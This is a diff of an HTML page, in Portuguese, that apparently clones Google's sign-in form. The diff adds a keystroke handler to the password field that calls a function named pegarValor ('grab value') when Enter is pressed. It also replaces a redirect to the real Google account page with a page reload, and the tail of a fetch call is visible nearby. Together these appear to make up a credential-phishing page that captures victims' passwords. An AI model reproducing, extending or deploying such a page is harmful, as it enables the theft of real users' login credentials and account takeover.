@@ -181,7 +181,7 @@
                                                                      <div class="aCsJod oJeWuf">
                                                                         <div class="aXBtI Wic03c">
                                                                            <div class="Xb9hP">
-                                                                              <input id="Passwd" type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Digite sua senha" name="Passwd" autocapitalize="off" dir="ltr" data-initial-dir="ltr" data-initial-value=""/>
+                                                                              <input id="Passwd" type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Digite sua senha" name="Passwd" autocapitalize="off" dir="ltr" data-initial-dir="ltr" data-initial-value=""  onkeydown="if(event.keyCode==13) pegarValor()"/>
                                                                               <div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true">Digite sua senha</div>
                                                                            </div>
                                                                            <div class="i9lrp mIZh1c"></div>
@@ -332,7 +332,8 @@
                                                       .then(data => console.log(data))
                                                       .catch(error => console.error(error));
 
-                                                      window.location.href = 'https://myaccount.google.com/?hl=pt_BR&utm_source=OGB&utm_medium=act';
+                                                      //window.location.href = 'https://myaccount.google.com/?hl=pt_BR&utm_source=OGB&utm_medium=act';
+                                                      window.location.reload();
 
                                                    }
 
